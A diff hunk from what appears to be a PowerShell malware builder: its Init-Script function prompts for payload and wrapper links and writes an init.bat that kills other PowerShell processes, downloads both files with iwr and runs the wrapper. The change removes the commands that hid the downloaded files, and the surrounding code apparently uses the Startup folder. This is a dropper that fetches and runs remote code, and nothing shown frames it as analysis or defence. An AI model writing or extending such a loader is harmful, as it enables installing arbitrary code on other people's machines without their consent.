@@ -1210,7 +1210,7 @@ function Init-Script {
     $wrapperLink = Read-Host "Wrapper link"
     Write-Host ""
 
-    $psCommand = "`$s=[Environment]::GetFolderPath('Startup'); `$a=[Environment]::GetFolderPath('ApplicationData'); Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$PID} | Stop-Process -Force; `$b='$payloadPath'; `$v='$wrapperPath'; Remove-Item `$b,`$v -Force -ErrorAction SilentlyContinue; iwr '$payloadLink' -OutFile `$b; attrib +h `$b; iwr '$wrapperLink' -OutFile `$v; attrib +h `$v; & `$v; exit"
+    $psCommand = "`$s=[Environment]::GetFolderPath('Startup'); `$a=[Environment]::GetFolderPath('ApplicationData'); Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$PID} | Stop-Process -Force; `$b='$payloadPath'; `$v='$wrapperPath'; Remove-Item `$b,`$v -Force -ErrorAction SilentlyContinue; iwr '$payloadLink' -OutFile `$b; iwr '$wrapperLink' -OutFile `$v; & `$v; exit"
 
     $batchContent = "powershell -NoProfile -Command `"$psCommand`""
     Set-Content -Path "init.bat" -Value $batchContent -Encoding ASCII
